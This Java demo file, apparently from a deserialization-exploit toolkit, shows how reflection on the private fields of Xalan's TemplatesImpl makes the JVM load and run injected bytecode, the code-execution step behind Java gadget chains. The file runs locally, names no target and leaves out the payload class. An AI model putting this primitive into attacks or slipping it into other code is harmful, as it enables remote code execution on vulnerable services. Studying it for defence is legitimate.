package com.ppp;

import org.ppp.tools.ClassFiles;
import org.ppp.tools.encryption.B64;

import java.io.Serializable;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 */
public class TransletClassLoaderDemo {
    public static void main(String[] args) throws Exception {
        String b64Str = new B64().encodeJavaClass(Exec.class);
        defineClass_TemplatesImpl(b64Str);
    }

    public static class PPP implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }

    // com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
    public static void defineClass_TemplatesImpl(String calcBase64) throws Exception {
        byte[] bytes = java.util.Base64.getDecoder().decode(calcBase64);
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
        java.lang.reflect.Field field = templates.getClass().getDeclaredField("_bytecodes");
        field.setAccessible(true);
        field.set(templates, new byte[][]{bytes, ClassFiles.classAsBytes(PPP.class)});
        field = templates.getClass().getDeclaredField("_name");
        field.setAccessible(true);
        field.set(templates, "anystr");
        field = templates.getClass().getDeclaredField("_transletIndex");
        field.setAccessible(true);
        field.set(templates, 0);
        field = templates.getClass().getDeclaredField("_tfactory");
        field.setAccessible(true);
        field.set(templates, new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());

        Method method = templates.getClass().getDeclaredMethod("getOutputProperties");
//        Method method = templates.getClass().getDeclaredMethod("getTransletInstance");
        method.setAccessible(true);
        method.invoke(templates, null);

//        templates.newTransformer();
    }
}
